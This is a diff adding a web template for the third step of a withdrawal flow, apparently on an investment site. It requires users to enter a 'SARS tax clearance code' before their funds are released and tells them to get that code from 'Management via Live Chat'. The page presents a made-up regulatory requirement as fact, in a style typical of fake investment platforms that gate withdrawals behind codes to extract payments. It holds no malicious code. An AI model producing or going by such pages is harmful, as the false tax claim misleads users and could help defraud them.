@@ -1,0 +1,106 @@
+{% extends "base/dashboard_base.html" %}
+{% block title %}Tax Code{% endblock %}
+{% block page_title %}Withdraw Funds{% endblock %}
+{% block page_subtitle %}Step 3 of 3 — Enter your SARS tax clearance code{% endblock %}
+
+{% block content %}
+<div class="max-w-xl mx-auto space-y-5">
+
+  <!-- Progress bar -->
+  <div class="card p-5 fade-up fade-up-1">
+    <div class="flex items-center gap-3 mb-3">
+      <div class="flex items-center gap-2">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold" style="background:rgba(198,214,232,0.3);color:#4d7dbf;">1</div>
+        <span class="text-gray-400 text-sm hidden sm:block">Amount</span>
+      </div>
+      <div class="flex-1 h-0.5" style="background:linear-gradient(90deg,#e08900,#fac660);"></div>
+      <div class="flex items-center gap-2">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold" style="background:rgba(198,214,232,0.3);color:#4d7dbf;">2</div>
+        <span class="text-gray-400 text-sm hidden sm:block">Auth Code</span>
+      </div>
+      <div class="flex-1 h-0.5" style="background:linear-gradient(90deg,#e08900,#fac660);"></div>
+      <div class="flex items-center gap-2">
+        <div class="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold text-white" style="background:linear-gradient(135deg,#e08900,#fac660);color:#03071e;">3</div>
+        <span class="text-navy-800 text-sm font-semibold hidden sm:block">Tax Code</span>
+      </div>
+    </div>
+    <p class="text-xs text-gray-400 text-center">Almost done — withdrawing: <strong class="text-navy-800 font-mono">R {{ amount|floatformat:2 }}</strong></p>
+  </div>
+
+  <!-- Tax code card -->
+  <div class="card p-8 fade-up fade-up-2">
+    <div class="text-center mb-7">
+      <div class="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4" style="background:linear-gradient(135deg,#fdeec0,#fac660);">
+        <svg class="w-8 h-8 text-amber-700" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.8" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/>
+        </svg>
+      </div>
+      <h2 class="font-display font-bold text-navy-900 text-2xl mb-2">SARS Tax Clearance Code</h2>
+      <p class="text-gray-500 text-sm leading-relaxed max-w-sm mx-auto">Enter your SARS-issued tax reference or clearance code. Once validated, your tax certificate PDF will be generated automatically.</p>
+    </div>
+
+    {% if error %}
+    <div class="mb-5 p-4 bg-red-50 border border-red-200 rounded-xl flex items-start gap-3">
+      <svg class="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      <p class="text-red-700 text-sm font-medium">{{ error }}</p>
+    </div>
+    {% endif %}
+
+    <form method="post" class="space-y-5" id="tax-form">
+      {% csrf_token %}
+      <div>
+        <label class="block text-sm font-semibold text-navy-800 mb-1.5">SARS Tax Code / Reference Number</label>
+        <input type="text" name="tax_code" id="tax-code"
+               class="form-input font-mono text-center text-lg tracking-wider uppercase"
+               placeholder="e.g. SARS-2025-TXC-001234"
+               maxlength="30" autocomplete="off" autofocus required
+               oninput="this.value=this.value.toUpperCase()">
+        <p class="text-gray-400 text-xs mt-1.5 text-center">Letters, numbers, and hyphens only · 6–30 characters</p>
+      </div>
+
+      <!-- What gets generated info -->
+      <div class="p-4 rounded-xl" style="background:#f5f8fd; border:1px solid #e2e9f3;">
+        <p class="text-navy-800 font-semibold text-xs mb-2">📄 What happens next</p>
+        <ul class="text-gray-500 text-xs space-y-1.5">
+          <li class="flex items-start gap-2"><span class="text-green-600 font-bold mt-0.5">✓</span> Your tax code is validated against your account</li>
+          <li class="flex items-start gap-2"><span class="text-green-600 font-bold mt-0.5">✓</span> A professional tax certificate PDF is generated instantly</li>
+          <li class="flex items-start gap-2"><span class="text-green-600 font-bold mt-0.5">✓</span> Your withdrawal request is submitted for admin approval</li>
+          <li class="flex items-start gap-2"><span class="text-green-600 font-bold mt-0.5">✓</span> The PDF is available to download from your confirmation page</li>
+        </ul>
+      </div>
+
+      <button type="submit" id="submit-btn" class="btn-gold w-full py-4 rounded-xl text-navy-900 font-bold text-base"
+              onclick="this.disabled=true; this.textContent='Generating certificate…'; document.getElementById('tax-form').submit();">
+        Submit &amp; Generate Tax Certificate →
+      </button>
+    </form>
+
+    <!-- How to get tax code -->
+    <div class="mt-6 p-5 rounded-xl" style="background:linear-gradient(135deg,#fff8e8,#fdeec0); border:1px solid rgba(224,137,0,0.25);">
+      <p class="text-amber-900 font-bold text-sm mb-2">📋 What is a SARS Tax Code?</p>
+      <p class="text-amber-800 text-xs leading-relaxed mb-3">South African Revenue Service (SARS) issues tax reference numbers and clearance codes for investment withdrawals above certain thresholds. This is required for regulatory compliance under the Income Tax Act.</p>
+      <div class="space-y-2">
+        <div class="flex items-start gap-3">
+          <span class="text-amber-700 font-bold text-xs mt-0.5 flex-shrink-0">OPTION 1</span>
+          <div>
+            <p class="text-amber-800 text-xs font-semibold">Contact Management via Live Chat</p>
+            <p class="text-amber-700 text-xs">Our team can assist you in obtaining and validating your tax code. Use the live chat widget or contact us at <a href="mailto:{{ SUPPORT_EMAIL }}" class="font-bold underline">{{ SUPPORT_EMAIL }}</a>.</p>
+          </div>
+        </div>
+        <div class="flex items-start gap-3">
+          <span class="text-amber-700 font-bold text-xs mt-0.5 flex-shrink-0">OPTION 2</span>
+          <div>
+            <p class="text-amber-800 text-xs font-semibold">SARS eFiling / SARS MobiApp</p>
+            <p class="text-amber-700 text-xs">Log in to <strong>eFiling (www.sars.gov.za)</strong> or the SARS MobiApp to obtain your tax reference number. This is typically your 10-digit income tax number.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="mt-4 text-center">
+      <a href="{% url 'withdrawal_home' %}" class="text-sm text-gray-400 hover:text-navy-700 transition-colors">← Cancel and go back</a>
+    </div>
+  </div>
+
+</div>
+{% endblock %}
